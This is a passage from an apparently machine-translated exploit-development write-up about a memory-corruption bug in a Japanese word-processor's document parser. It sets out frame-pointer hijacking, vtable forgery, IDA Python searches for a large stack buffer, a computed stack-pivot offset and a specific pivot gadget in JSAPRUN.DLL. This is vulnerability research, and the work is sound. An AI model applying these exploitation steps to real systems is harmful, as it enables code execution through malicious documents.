[3] -a8:+0x4     int 'lv_canary_10'  (<class 'int'>, 4)
[4] -a4:+0x4     int 'lv_reg(edi)_c' (<class 'int'>, 4)
[5] -a0:+0x4     int 'lv_reg(esi)_8' (<class 'int'>, 4)
[6] -9c:+0x4     int 'lv_reg(ebx)_4' (<class 'int'>, 4)
[7] -98:+0x4 char[4] ' r'            [(<class 'int'>, 1), 4]
[8] -94:+0x4     int 'arg_0'         (<class 'int'>, 4)
[0] -80:+0x4     int 'var_10'     (<class 'int'>, 4)
[1] -74:+0x4     int 'var_4'      (<class 'int'>, 4)
[2] -70:+0x4 char[4] ' s'         [(<class 'int'>, 1), 4]
[3] -6c:+0x4 char[4] ' r'         [(<class 'int'>, 1), 4]
[4] -68:+0x4     int 'ap_owner_0' (<class 'int'>, 4)
[5] -64:+0x4     int 'ap_owner_4' (<class 'int'>, 4)
```  
  
  
然而，有一个警告，因为该方法仅在使用 初始化object_9c2d50::create_field(64)_6bf3a6该字段时被调用。因此，我们将使用反编译器在我们的范围内找到对此字段的所有已知全局引用，并使用它们来确定是否有某种方法可以初始化该值。  
object_9c2d50.v_data_4.p_object_600x00000000  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdsckjOQ8H3MFsLp4JxhpDrjkmy0EygyZKAmm5UstfthJdjABq3AM2BYTw/640?wx_fmt=png&from=appmsg "")  
  
不幸的是，从这些结果来看，该  
object_9c2d50.v_data_4.p_object_60字段仅在进入和退出时初始化，并且要求该对象不是由任何其他记录类型构造的。使用调试器验证这一点表明，这种情况阻止我们使用利用此路径所需的任何其他可用记录类型。  
  
  
然而，我们还有更多的候选人可以通过。另一个是在 内部的第一个函数调用处  
struc_3a9de4::parseStylesContent_3a7048。这会下降到  
struc_3a9de4::readBoxHeader?_3a6fae函数中，然后函数依赖于库中定义的方法  
JSVDA.DLL。该方法的序言还将  
%edi寄存器压入堆栈。如果我们在写入此地址时设置内存访问断点并修改文档以避免遇到我们在函数中识别的任何其他条件，我们可以确认保留的引用可以  
lv_struc_38在我们所需的范围内访问。   
  
  
最后，我们已经能够将漏洞的功能（最初是越界数组索引）扩展到具有 32 位写入的相对取消引用。然后，我们重用了包含漏洞的函数中的一些功能，将漏洞提升为对绝对地址的任意长度写入。之后，我们利用控制流来允许我们对  
object_9c2044::parseStream(DocumentEditStyles)_3a6cb2属于其调用者的方法所保留的帧执行帧指针覆盖  
object_9c2044::method_processStreams_77af0f。在应用程序解析我们的流并返回到此方法后，我们应该能够控制帧指针和方法的局部变量。这应该使我们能够更优雅地劫持执行，并且仍然允许我们修复我们的漏洞造成的损害。  
  
  
**劫持帧指针**  
  
一旦我们开发了控制仍在我们处理文档范围内的方法的框架指针的能力，我们就可以检查框架并确定我们可以使用我们现有的功能来修改哪些内容。我们在上一节中覆盖的框架表明我们只能控制几个变量。不幸的是，此时我们用于执行漏洞的流已经被关闭，如果我们直接篡改该框架并且该方法最终完成执行，则该函数的 Epilog 将因金丝雀检查而失败，导致快速执行- 终止和进程退出。  
  
```
# List the frame belonging to the caller of the function containing the vulnerability.
<class 'structure' name='$ F3C1FAF0F' offset=-0x264 size=0x278>
[0]  -264+0x4                       int 'var_25C'            (<class 'int'>, 4)
[1]  -260+0x4                       int 'var_258'            (<class 'int'>, 4)
[2]  -25c+0x4                       int 'var_254'            (<class 'int'>, 4)
[3]  -258+0x4                       int 'var_250'            (<class 'int'>, 4)
[4]  -254+0x18  frame_77af0f::field_24c 'lv_struc_24c'       <class 'structure' name='frame_77af0f::field_24c' offset=-0x254 size=0x18>
[5]  -23c+0x4                       int 'lp_stackObject_234' (<class 'int'>, 4)
[6]  -238+0x4       JSVDA::object_OFRM* 'lp_oframe_230'      (<class 'type'>, 4)
[7]  -234+0x228           object_2f27f8 'lv_object_22c'      <class 'structure' name='object_2f27f8' offset=-0x234 size=0x228>
[8]    -c+0x4                       int 'lv_result_4'        (<class 'int'>, 4)
[9]    -8+0x4                   char[4] ' s'                 [(<class 'int'>, 1), 4]
[10]   -4+0x4                   char[4] ' r'                 [(<class 'int'>, 1), 4]
[11]    0+0x4       JSVDA::object_OFRM* 'ap_oframe_0'        (<class 'type'>, 4)
[12]    4+0x4              unsigned int 'av_documentType_4'  (<class 'int'>, 4)
[13]    8+0x4              unsigned int 'av_flags_8'         (<class 'int'>, 4)
[14]    c+0x4             struc_79aa9a* 'ap_stackobject_c'   (<class 'type'>, 4)
[15]   10+0x4                       int 'ap_null_10'         (<class 'int'>, 4)
 
# The object located at offset -0x238 of the frame.
<class 'structure' name='JSVDA::object_OFRM' size=0x8> // [alloc.tag] OFRM
[0] 0+0x4 int 'p_vftable_0' (<class 'int'>, 4) // [vftable] 0x278186F0
[1] 4+0x4 int 'v_index_4'   (<class 'int'>, 4) // {'note': 'object_117c5 handle', 'alloc.tag': 'MFCM', '__name__': 'v_index_4'}
```  
  
  
此列表显示了我们将使用的对象的内容。如前所述，它包含单个字段并用于从文档中读取。该字段是一个整数，表示完全不同的模块中的对象数组的索引。该外部数组中的每个对象都是一个打开的文档，该文档根据应用程序的使用情况而变化。因此，该字段可以被视为一个句柄，如果不知道模块的内容或用户已经执行的操作，该句柄可能无法伪造。  
  
  
但是，我们确实可以控制该对象的虚拟方法表引用，并且由于我们还没有完全破坏应用程序，因此我们可以从其他地方捕获句柄，并在稍后阶段使用它来重新伪造该对象。赢得了堆栈的控制权。之后，我们可以在装载机期间修复框架，以保持应用程序的良好信誉。  
  
```
.text:3C1FB1B6     loc_3C1FB1B6:
.text:3C1FB1B6 260                 push    [ebp+av_flags_8]
.text:3C1FB1B9 264                 mov     eax, [ebp+av_flags_8]
.text:3C1FB1BC 264                 push    ecx
.text:3C1FB1BD 268                 and     eax, 800h
.text:3C1FB1C2 268                 mov     ecx, esi
.text:3C1FB1C4 268                 push    ebx
.text:3C1FB1C5 26C                 mov     [ebp+lv_struc_24c.field_14], eax
.text:3C1FB1CB 26C                 call    object_9c2044::parseStream(DocumentViewStyles)_3a790a ; [note.exp] define some styles, ensure everything is initialized.
.text:3C1FB1D0 260                 mov     ebx, eax
.text:3C1FB1D2 260                 cmp     ebx, edi
.text:3C1FB1D4 260                 jnz     loc_3C1FAFD2
 
.text:3C1FB1DA 260                 push    [ebp+av_flags_8]
.text:3C1FB1DD 264                 mov     ecx, esi
.text:3C1FB1DF 264                 push    [ebp+av_documentType_4]
.text:3C1FB1E2 268                 push    [ebp+lp_oframe_230]
.text:3C1FB1E8 26C                 call    object_9c2044::parseStream(DocumentEditStyles)_3a6cb2 ; [note.exp] hijack frame pointer here
.text:3C1FB1ED 260                 mov     ebx, eax
.text:3C1FB1EF 260                 cmp     ebx, edi
.text:3C1FB1F1 260                 jnz     loc_3C1FAFD2
 
.text:3C1FB1F7 260                 push    [ebp+lp_stackObject_234]
.text:3C1FB1FD 264                 mov     ecx, [esi+2D8h] ; this
.text:3C1FB203 264                 push    [ebp+av_flags_8] ; av_flags_8
.text:3C1FB206 268                 push    [ebp+av_documentType_4] ; av_documentType_4
.text:3C1FB209 26C                 push    [ebp+lp_oframe_230] ; ap_oframe_0
.text:3C1FB20F 270                 call    object_10cbd2::processSomeStreams_778971 ; [note.exp] hijack execution here
.text:3C1FB214 264                 mov     ebx, eax
.text:3C1FB216 264                 cmp     ebx, edi
.text:3C1FB218 264                 jnz     loc_3C1FAFD2
```  
  
  
我们能够劫持执行的第一个地方是当拥有我们正在控制的虚拟方法表的对象用于打开下一个流时。列出的代码显示了我们控制帧指针的范围。在我们的漏洞利用中，我们在这里劫持执行并完全转向我们控制的堆栈，以完成将可执行代码加载到地址空间的必要任务。   
  
```
.text:3C1FB1F7 260                 push    [ebp+lp_stackObject_234]
.text:3C1FB1FD 264                 mov     ecx, [esi+2D8h] ; this
.text:3C1FB203 264                 push    [ebp+av_flags_8] ; av_flags_8
.text:3C1FB206 268                 push    [ebp+av_documentType_4] ; av_documentType_4
.text:3C1FB209 26C                 push    [ebp+lp_oframe_230] ; ap_oframe_0
.text:3C1FB20F 270                 call    object_10cbd2::processSomeStreams_778971 ; [note.exp] hijack execution here
\
.text:3C1F8971 000                 push    0A4h
.text:3C1F8976 004                 mov     eax, offset byte_3C3CCE1A
.text:3C1F897B 004                 call    __EH_prolog3_catch_GS
.text:3C1F8980 0C4                 mov     edi, ecx
.text:3C1F8982 0C4                 mov     [ebp+lp_this_64], edi
...
.text:3C1F89B1 0C4                 lea     eax, [ebp+lp_stream_50]
.text:3C1F89B4 0C4                 push    eax
.text:3C1F89B5 0C8                 push    ebx
.text:3C1F89B6 0CC                 call    object_FRM::getStream(GroupingFileName)_1b974d
\
.text:3BC3974D 000                 push    ebp
.text:3BC3974E 004                 mov     ebp, esp
.text:3BC39750 004                 push    [ebp+ap_result_4] ; JSVDA::object_OSEG **
.text:3BC39753 008                 push    10h             ; av_flags_8
.text:3BC39755 00C                 push    offset str.GroupingFileName ; [OpenStreamByName.reference] 0x3bc3975d
.text:3BC3975A 010                 push    [ebp+ap_oframe_0] ; ap_oframe_0
.text:3BC3975D 014                 call    object_OFRM::openStreamByName?_132de4
\
.text:3BBB2DE4 000                 push    ebp
.text:3BBB2DE5 004                 mov     ebp, esp
.text:3BBB2DE7 004                 push    ecx
.text:3BBB2DE8 008                 mov     eax, ___security_cookie
.text:3BBB2DED 008                 xor     eax, ebp
.text:3BBB2DEF 008                 mov     [ebp+var_4], eax
...
.text:3BBB2E1D     loc_3BBB2E1D:
.text:3BBB2E1D 00C                 push    [ebp+ap_result_c]
.text:3BBB2E20 010                 mov     ecx, [ebp+ap_oframe_0]
.text:3BBB2E23 010                 push    0
.text:3BBB2E25 014                 push    [ebp+av_flags_8]
.text:3BBB2E28 018                 mov     edx, [ecx+JSVDA::object_OFRM.p_vftable_0] ; [note.exp] this is ours
.text:3BBB2E2A 018                 push    0
.text:3BBB2E2C 01C                 push    eax
.text:3BBB2E2D 020                 push    ecx
.text:3BBB2E2E 024                 call    dword ptr [edx+10h] ; [note.exp] branch here
\
; int __stdcall object_OFRM::method_openStream_2b5c5(JSVDA::object_OFRM *ap_this_0, wchar_t *ap_streamName_4, int a_unused_8, char avb_flags_c, int a_unused_10, JSVDA::object_OSEG **ap_result_14)
.text:277CB5C5     object_OFRM::method_openStream_2b5c5 proc near
.text:277CB5C5
.text:277CB5C5 000                 push    ebp
.text:277CB5C6 004                 mov     ebp, esp
.text:277CB5C8 004                 push    ecx
.text:277CB5C9 008                 push    ecx
.text:277CB5CA 00C                 push    ebx
.text:277CB5CB 010                 mov     ebx, [ebp+ap_result_14]
...
```  
  
  
在清单中，我们依次遍历执行期间调用的不同方法，直到到达名为 的虚拟方法  
JSVDA::object_OFRM::method_openStream_2b5c5。该方法被取消引用，然后调用以打开文档中的下一个流。这是我们将用来劫持执行的虚拟方法。  
  
  
虚拟方法属于模块，在调用之前需要六个参数。在我们重新调整用途时需要考虑到这一点。由于堆栈将通过将所述参数和保留的返回地址推入堆栈的实现来调整，因此我们将需要在新框架中包含此调整。  
JSVDA::object_OFRM::method_openStream_2b5c5JSVDA.DLL  
  
  
至此，我们已经拥有执行代码所需的一切。但是，在执行指令后，我们需要某种方法来恢复执行。为了实现这一目标，我们需要将堆栈转向我们控制的堆栈。一般来说，我们可以通过两种方式来旋转堆栈。一种方法是找到一个可预测的地址，我们可以将地址写入其中，然后使用一个枢轴来将该地址显式分配给寄存器  
%esp。另一种方法是调整  
%esp寄存器以引用我们控制其内容的堆栈的一部分。为了避免使用该漏洞将另一个连续的数据块写入某个已知位置，选择后一种方法作为主要候选方法。  
  
  
**旋转堆栈指针**  
  
尽管我们控制帧指针并可以使用它为指令指针分配任意值，但我们没有明确的方法来执行多个指令序列以从文档加载可执行代码。因此，我们需要某种方法将堆栈指针设置为一个内存块，我们可以使用该内存块在执行加载有效负载所需的每个块后恢复执行。  
  
  
如前所述，该漏洞发生在目标解析的第一个流中。因此，由于我们的文档对应用程序影响不大，因此有必要在流解析器中找到逻辑来满足我们的需求。当我们尝试执行位于模块内多个位置的代码时，我们需要流解析实现中的一些逻辑，可用于将大量数据加载到应用程序的堆栈中。为了发现这一点，我们可以在样式记录解析器的入口点使用一个快速脚本来枚举所有被调用的函数，并识别为其框架分配了大尺寸的函数。  
  
  
在下面的查询中，它似乎  
object_9c2044::readStyleType(1000)_4d951d是一个可能的候选者。通过手动逆向该方法，我们可以证明其实现在  
0x18C8堆栈上分配字节并将  
0x1000其关联记录中的字节直接读取到该分配的缓冲区中。  
  
```
# Grab the address of the function containing the different cases for record parsing
Python> f = db.a('struc_3a9de4::parseStylesContent_3a7048')
 
# List all functions that are called that also have a frame.
Python> db.functions.list(frame=True, ea=[ins.op_ref(oref) for oref in func.calls(f) if 'x' in oref])
[0]  +0x0b8d12 : 0x3bb38d12..0x3bb38d71 : (1) FvD+ : __thiscall object_9c2d50::get_field(180)_b8d12                  : lvars:001c args:2 refs:7   exits:1
[1]  +0x109b2a : 0x3bb89b2a..0x3bb89b9e : (1) FvD+ : __thiscall object_10cbd2::get_field(3c)_109b2a                  : lvars:001c args:2 refs:100 exits:1
[2]  +0x1329ce : 0x3bbb29ce..0x3bbb29e8 : (1) Fvt+ :    __cdecl object_OSEG::setCurrentStreamPosition_1329ce         : lvars:0000 args:5 refs:182 exits:1
[3]  +0x1b6bf7 : 0x3bc36bf7..0x3bc36d66 : (1) FvD* : __thiscall object_9e5ffc::readStyleType(1000)_1b6bf7            : lvars:0044 args:4 refs:1   exits:1
[4]  +0x1b8cd2 : 0x3bc38cd2..0x3bc38d0b : (1) FvD* : __thiscall object_9e5ffc::readStyleType(1001)_1b8cd2            : lvars:0004 args:4 refs:1   exits:1
[5]  +0x1b8f99 : 0x3bc38f99..0x3bc39723 : (1) FvD* : __thiscall object_9bd0e4::readStyleType(2001)_1b8f99            : lvars:00a0 args:7 refs:2   exits:1
[6]  +0x1cdcf6 : 0x3bc4dcf6..0x3bc4df7b : (1) FvD* : __thiscall object_9bd184::readStyleType(2002)_1cdcf6            : lvars:0040 args:5 refs:1   exits:1
[7]  +0x1d24a9 : 0x3bc524a9..0x3bc52bef : (1) FvD* : __thiscall object_9bd0e4::readStyleType(2001)_1d24a9            : lvars:00b4 args:6 refs:1   exits:1
[8]  +0x1d63a3 : 0x3bc563a3..0x3bc56601 : (1) FvT* : __thiscall object_9bd120::readStyleType(2003)_1d63a3            : lvars:0094 args:5 refs:1   exits:1
[9]  +0x391906 : 0x3be11906..0x3be11d9c : (1) FvT* : __thiscall object_9d0d30::readStyleType(2008)_391906            : lvars:00c4 args:7 refs:1   exits:2
[10] +0x392cab : 0x3be12cab..0x3be12ee2 : (1) FvT* : __thiscall object_9d0d30::readStyleType(2010)_392cab            : lvars:0064 args:7 refs:1   exits:1
[11] +0x393e4b : 0x3be13e4b..0x3be13f08 : (1) F-D+ :    __cdecl object_OSEG::pushCurrentStream?_393e4b               : lvars:000c args:5 refs:1   exits:1
[12] +0x3a6bec : 0x3be26bec..0x3be26cb2 : (1) FvD* : __thiscall struc_3a9de4::readStyleType(2005)_3a6bec             : lvars:0014 args:4 refs:1   exits:1
[13] +0x3a6cf0 : 0x3be26cf0..0x3be26d44 : (1) FvD+ :    __cdecl object_OSEG::decode_long_3a6cf0                      : lvars:001c args:2 refs:86  exits:1
[14] +0x3a6d44 : 0x3be26d44..0x3be26d8b : (1) FvT+ : __thiscall box_header::deserialize_3a6d44                       : lvars:000c args:2 refs:7   exits:1
[15] +0x3a6d8b : 0x3be26d8b..0x3be26fae : (1) F-T+ : __thiscall struc_3a9de4::ensureFieldObjectsConstructed??_3a6d8b : lvars:0008 args:2 refs:11  exits:1
[16] +0x3a6fae : 0x3be26fae..0x3be27048 : (1) FvT+ : __thiscall struc_3a9de4::readBoxHeader?_3a6fae                  : lvars:0024 args:2 refs:2   exits:1
[17] +0x3a7664 : 0x3be27664..0x3be276be : (1) FvT+ :    __cdecl object_OSEG::read_ushort_3a7664                      : lvars:001c args:2 refs:90  exits:1
[18] +0x3a96ed : 0x3be296ed..0x3be2972f : (1) F-D+ : __thiscall struc_3a9de4::get_flagField_3a96ed                   : lvars:0008 args:2 refs:2   exits:1
[19] +0x4d951d : 0x3bf5951d..0x3bf5958a : (1) FvD* :    __cdecl object_9c2044::readStyleType(1000)_4d951d            : lvars:18d4 args:4 refs:1   exits:1
[20] +0x6bf3a6 : 0x3c13f3a6..0x3c13f3e7 : (1) FvD+ : __thiscall object_9c2d50::create_field(64)_6bf3a6               : lvars:0020 args:1 refs:7   exits:1
[21] +0x779662 : 0x3c1f9662..0x3c1f96c0 : (1) F-t+ : __thiscall sub_3C1F9662                                         : lvars:0004 args:2 refs:3   exits:1
[22] +0x779828 : 0x3c1f9828..0x3c1f98ad : (1) FvD* : __thiscall object_9e82a0::deserialize_field_779828              : lvars:0028 args:2 refs:1   exits:1
[23] +0x77a7bf : 0x3c1fa7bf..0x3c1fa892 : (1) FvD* : __thiscall object_e7480::readStyleType(1002)_77a7bf             : lvars:0028 args:6 refs:1   exits:1
[24] +0x7b15a6 : 0x3c2315a6..0x3c23161a : (1) FvD+ : __thiscall object_10cbd2::get_field(38)_7b15a6                  : lvars:001c args:2 refs:36  exits:1
[25] +0x7b9e07 : 0x3c239e07..0x3c239e7c : (1) FvD+ : __thiscall object_10cbd2::get_field(34)_7b9e07                  : lvars:001c args:2 refs:98  exits:1
[26] +0x861925 : 0x3c2e1925..0x3c2e1993 : (1) FvD+ : __thiscall object_9e82a0::method_createfield_861925             : lvars:0040 args:1 refs:2   exits:1
 
# It looks like item #19, object_9c2044::readStyleType(1000)_4d951d, has more space allocated for its "lvars" than any of the others.
```  
  
  
此时，我们可以调整漏洞的概念验证以包含  
0x1000记录类型。然后我们可以在该方法上设置断点来证明它在运行时正在执行。然而，设置断点后，该方法不会被执行。相反，  
object_9e5ffc::readStyleType(1000)_1b6bf7调用另一个函数来读取记录类型  
0x1000。反转该方法的内容后，我们很幸运，它使用不同的方法  
0x1020在堆栈上分配字节。如果我们像下面的清单一样扩展查询，很可能会发现这一点。  
  
```
# Define a few temporary functions.
def guess_prolog(f, minimum):
    '''Use the stackpoints to guess the prolog by searching for a minimum. Right way would be to check "$ ignore micro"...'''
    fn, start = func.by(f), func.address(f)
    iterable = (ea for ea, delta in func.chunks.stackpoints(f) if abs(idaapi.get_sp_delta(fn, ea)) > minimum)
    return start, next(iterable, start)
 
# No register calls
filter_out_register = lambda opref: not isinstance(ins.op(opref), register_t)
 
# Use itertools.chain to flatten results through db.functions
flatten_calls = lambda fs: set(itertools.chain(fs, db.functions(ea=filter(func.has, map(ins.op_ref, itertools.chain(*map(func.calls, fs)))))))
 
# Start at style record parser, flatten the first layer of calls.
Python> f = db.a('struc_3a9de4::parseStylesContent_3a7048')
Python> db.functions.list(ea=flatten_calls(flatten_calls(func.calls(f))))
[0]   +0x00140c : 0x3ba8140c..0x3ba81412 : (1) J-D* : __thiscall JSFC_2094                                            : lvars:0000 args:8 refs:2256  exits:0
[1]   +0x089368 : 0x3bb09368..0x3bb0936e : (1) J-D* :  __stdcall JSFC_5190                                            : lvars:0000 args:2 refs:25    exits:0
[2]   +0x090e42 : 0x3bb10e42..0x3bb10e48 : (1) J-D* : __thiscall JSFC_5438                                            : lvars:0000 args:3 refs:32    exits:0
[3]   +0x0915ea : 0x3bb115ea..0x3bb115f0 : (1) J-D* : __thiscall JSFC_3583                                            : lvars:0000 args:2 refs:620   exits:0
...
[120] +0x8ea58a : 0x3c36a58a..0x3c36a5c1 : (1) LvD+ : __usercall __EH_prolog3_catch                                   : lvars:0000 args:1 refs:1613  exits:1
[121] +0x8ea600 : 0x3c36a600..0x3c36a62d : (1) LvD+ : __usercall __alloca_probe                                       : lvars:0000 args:2 refs:1082  exits:1
[122] +0x8ea914 : 0x3c36a914..0x3c36a920 : (1) LvD+ :  __unknown ___report_rangecheckfailure                          : lvars:0000 args:0 refs:104   exits:2
 
# Filter those 123 functions looking for one with a large frame size.
Python> db.functions.list(ea=flatten_calls(func.calls(f)), frame=True, predicate=lambda f: func.frame(f).size > 0x1000)
[0] +0x4d951d : 0x3bf5951d..0x3bf5958a : (1) FvD* : __cdecl object_9c2044::readStyleType(1000)_4d951d : lvars:18d4 args:4 refs:1 exits:1
 
# Search another layer deeper.
Python> db.functions.list(ea=flatten_calls(flatten_calls(func.calls(f))), frame=True, predicate=lambda f: func.frame(f).size > 0x1000)
[0] +0x1b6d66 : 0x3bc36d66..0x3bc36e26 : (1) F?D+ :    __cdecl object_OSEG::method_readHugeBuffer(1000)_1b6d66 : lvars:1020 args:7 refs:2 exits:1
[1] +0x4d951d : 0x3bf5951d..0x3bf5958a : (1) FvD* :    __cdecl object_9c2044::readStyleType(1000)_4d951d       : lvars:18d4 args:4 refs:1 exits:1
[2] +0x77ad4b : 0x3c1fad4b..0x3c1fae93 : (1) FvD+ : __thiscall sub_3C1FAD4B                                    : lvars:1074 args:1 refs:1 exits:1
 
# 3 results. Record type 0x1000 looks like it's worth considering (and hence was named as such).
```  
  
  
我们可以通过在此方法上设置断点并验证该  
object_9e5ffc::readStyleType(1000)_1b6bf7方法是否将  
0x1000数据字节从流加载到堆栈来确认该方法在运行时满足我们的要求。  
  
  
现在我们已经找到了能够将大量数据从流读取到其帧中的候选者，我们需要知道要调整多少堆栈指针才能到达它。为了确定这个值，我们需要计算大小缓冲区的偏移量  
0x1000与我们打算控制执行时堆栈指针的值之间的距离。这两个点的回溯在方法中相交，为  
0x3C1FAF0F, object_9c2044::method_processStreams_77af0f。因此，我们只需要距属于该函数的框架的距离。  
  
```
# Backtraces for the function where we hijack execution and where we can allocate a huge stack buffer.
Python> hijack_backtrace =                       [0x3bbb2de4, 0x3be276be, 0x3be26cb2, 0x3c1faf0f, 0x3c1fb3ed, 0x3c1fb4ab, 0x3be27954]
Python> huge_backtrace = [0x3bc36d66, 0x3bc36bf7, 0x3be27048, 0x3be276be, 0x3be26cb2, 0x3c1faf0f, 0x3c1fb3ed, 0x3c1fb4ab, 0x3be27954]
 
Python> diffindex = next(index for index, (L1,L2) in enumerate(zip(hijack_backtrace[::-1], huge_backtrace[::-1])) if L1 != L2)
Python> assert(hijack_backtrace[-diffindex] == huge_backtrace[-diffindex])
 
# Use the index as the common function call, and grab all the frames that are distinct.
Python> commonframe = func.frame(hijack_backtrace[-diffindex])
Python> hijack, huge = (listmap(func.frame, items) for items in [hijack_backtrace[:-diffindex], huge_backtrace[:-diffindex]])
 
# Display the functions belonging to the callstacks where we want to hijack execution,
# and the function to use for allocating a large amount of data from the document.
Python> pp(listmap(fcompose(func.by, func.name), hijack + [commonframe])[::-1])
['object_9c2044::method_processStreams_77af0f',
 'object_9c2044::parseStream(DocumentEditStyles)_3a6cb2',
 'object_9c2044::parseStream(DocumentViewStyles,DocumentEditStyles)_3a76be',
 'object_OFRM::openStreamByName?_132de4']
 
Python> pp(listmap(fcompose(func.by, func.name), huge + [commonframe])[::-1])
['object_9c2044::method_processStreams_77af0f',
 'object_9c2044::parseStream(DocumentEditStyles)_3a6cb2',
 'object_9c2044::parseStream(DocumentViewStyles,DocumentEditStyles)_3a76be',
 'struc_3a9de4::parseStylesContent_3a7048',
 'object_9e5ffc::readStyleType(1000)_1b6bf7',
 'object_OSEG::method_readHugeBuffer(1000)_1b6d66']
 
# Display the frame belonging to the function triggering the vulnerability. We will be hijacking the return
# pointer inside this frame at -0xA8 from the frame for `object_9c2044::method_processStreams_77af0f`.
Python> struc.right(commonframe, [frame.members for frame in hijack])[0]
<class 'structure' name='$ F3BBB2DE4' offset=-0xb4 size=0x20>
[0] -b4+0x2               __int16 'anonymous_0'     (<class 'int'>, 2)
    -b2+0x2                                         [None, 2]
[1] -b0+0x4                   int 'var_4'           (<class 'int'>, 4)
[2] -ac+0x4               char[4] ' s'              [(<class 'int'>, 1), 4]
[3] -a8+0x4               char[4] ' r'              [(<class 'int'>, 1), 4]
[4] -a4+0x4   JSVDA::object_OFRM* 'ap_oframe_0'     (<class 'type'>, 4)
[5] -a0+0x4                 char* 'ap_streamName_4' (<class 'type'>, 4)
[6] -9c+0x4                   int 'av_flags_8'      (<class 'int'>, 4)
[7] -98+0x4  JSVDA::object_OSEG** 'ap_result_c'     (<class 'type'>, 4)
 
# Display the frame belonging to the function that we can use for loading a large
# amount of data from the document. Our data is loaded at -0x114C from the common frame.
Python> struc.right(commonframe, [frame.members for frame in huge])[0]
<class 'structure' name='$ F3BC36D66' offset=-0x1168 size=0x1044>
     -1168+0xc                                                 [None, 12]
[0]  -115c+0x4                     int 'var_1014'              (<class 'int'>, 4)
[1]  -1158+0x4                     int 'var_1010'              (<class 'int'>, 4)
[2]  -1154+0x4                     int 'var_100C'              (<class 'int'>, 4)
[3]  -1150+0x4              box_header 'lv_boxHeader_1008'     <class 'structure' name='box_header' offset=-0x1150 size=0x4>
[4]  -114c+0x1000           char[4096] 'lv_buffer(1000)_1004'  [(<class 'int'>, 1), 4096]
[5]   -14c+0x4                     int 'lv_canary_4'           (<class 'int'>, 4)
[6]   -148+0x4                 char[4] ' s'                    [(<class 'int'>, 1), 4]
[7]   -144+0x4                 char[4] ' r'                    [(<class 'int'>, 1), 4]
[8]   -140+0x4     JSVDA::object_OSEG* 'ap_oseg_0'             (<class 'type'>, 4)
[9]   -13c+0x4                     int 'av_size_4'             (<class 'int'>, 4)
[10]  -138+0x4                    int* 'ap_resultSize_8'       (<class 'type'>, 4)
[11]  -134+0x4    object_9e5ffc::data* 'ap_unused_c'           (<class 'type'>, 4)
[12]  -130+0x4       JSFC::CPtrArray** 'ap_ptrArray_10'        (<class 'type'>, 4)
[13]  -12c+0x4       JSFC::CPtrArray** 'ap_ptrArray_14'        (<class 'type'>, 4)
[14]  -128+0x4                     int 'avw_usedFromHeader_18' (<class 'int'>, 4)
 
# List the members needed to calculate the number of bytes we need to pivot the
# stack pointer into a buffer that contains more data read from the file.
Python> struc.right(commonframe, [frame.members for frame in hijack])[0].list(' *')
[2] -ac:+0x4 char[4] ' s' [(<class 'int'>, 1), 4]
[3] -a8:+0x4 char[4] ' r' [(<class 'int'>, 1), 4]
 
Python> struc.right(commonframe, [frame.members for frame in huge])[0].list(index=range(8), predicate=lambda m: m.size >= 0x100)
[4] -114c:+0x1000 char[4096] 'lv_buffer(1000)_1004' [(<class 'int'>, 1), 4096]
 
# Take the difference between the buffer with our stream data, and the stack
# pointer at the point where we can execute an address of our choosing.
Python> stack_offset_at_time_of_call = -0xA8 - 6 * 4 - 4
Python> -0x114c - stack_offset_at_time_of_call
-0x1088
```  
  
  
通过连续布置每个帧，我们可以看到从劫持点的堆栈指针到所属帧的距离0x3BE276BE是  
+0xA8字节。但是，我们需要通过六个参数对其进行调整，并包括前面所述的保存的返回地址。这将得出  
0xC4第一距离的总字节数。接下来，我们计算从包含巨大缓冲区的帧到 拥有的帧的距离  
0x3BE276BE。这将得出总字节距离  
+0x114C。这两个距离的差异结果以字节为  
+0x1088单位。这是我们将调整堆栈指针的值，以便我们可以将执行直接转移到包含所需堆栈布局的巨大缓冲区中。  
  
  
**劫持执行并使用pivot**  
  
由于我们之前致力于推广该漏洞，我们已将其开发为能够在地址空间内的任何位置写入任意数量的数据。我们还确定了如何控制帧指针，这使我们能够  
%ecx在拥有该帧的方法中控制寄存器。该寄存器包含  
this引用对象的指针，当实现需要访问对象的属性或必要的虚拟方法时使用。控制帧指针后，我们现在可以伪造该对象并替换我们选择的要取消引用的地址作为虚拟方法表。  
  
```
.text:3BBB2E1D     loc_3BBB2E1D:                           ; CODE XREF: object_OFRM::openStreamByName?_132de4+17↑j
.text:3BBB2E1D 00C                 push    [ebp+ap_result_c]
.text:3BBB2E20 010                 mov     ecx, [ebp+ap_oframe_0]
.text:3BBB2E23 010                 push    0
.text:3BBB2E25 014                 push    [ebp+av_flags_8]
.text:3BBB2E28 018                 mov     edx, [ecx+JSVDA::object_OFRM.p_vftable_0] ; [note.exp] we control this with our frame pointer
.text:3BBB2E2A 018                 push    0
.text:3BBB2E2C 01C                 push    eax
.text:3BBB2E2D 020                 push    ecx
.text:3BBB2E2E 024                 call    dword ptr [edx+10h] ; [note.exp] our forged vftable contains our target at +0x10
.text:3BBB2E31 00C                 lea     esp, [ebp-8]
.text:3BBB2E34 00C                 pop     esi
.text:3BBB2E35 008                 mov     ecx, [ebp+var_4]
.text:3BBB2E38 008                 xor     ecx, ebp        ; StackCookie
.text:3BBB2E3A 008                 call    __security_check_cookie(x)
.text:3BBB2E3F 008                 leave
.text:3BBB2E40 000                 retn
```  
  
  
在清单中，我们需要指定要在  
+0x10伪造的虚拟方法表的偏移处执行的地址。这将导致列出的指令取消引用受控对象的虚拟方法，并允许我们劫持执行。在上一节中，我们计算了堆栈指针与可用于将流中的一页数据加载到堆栈缓冲区中的位置之间的距离。剩下要做的唯一主要事情是找到一个堆栈枢轴，我们可以将其与上一节中的大小一起使用，以将堆栈指针调整为流数据的页面大小。一旦我们完成了旋转，我们就可以连续执行必要的指令来将我们的有效负载加载到  
address-space.  
  
  
通过枚举应用程序中的不可重定位模块  
address-space，我们可以识别以下指令序列的许多实例。这些序列中的每一个都允许我们使用  
-0x18相对于寄存器加载的值来调整堆栈指针  
%ecx。由于我们  
%ecx由于帧覆盖而完全控制了寄存器，因此我们可以存储之前计算的-0x18从  
%ecx寄存器到伪造的调用堆栈的距离。然后，我们完成的过程可以通过创建一个假虚拟方法表来总结，将列出的序列之一的地址分配给  
+0x10它的偏移量，然后存储我们在  
-0x18它的距离。当调用虚拟方法时，我们将开始实际劫持应用程序指令指针的第一阶段。  
  
```
JSAPRUN.DLL     0x610202e0: add esp, dword ptr [ecx - 0x18]; ret; 
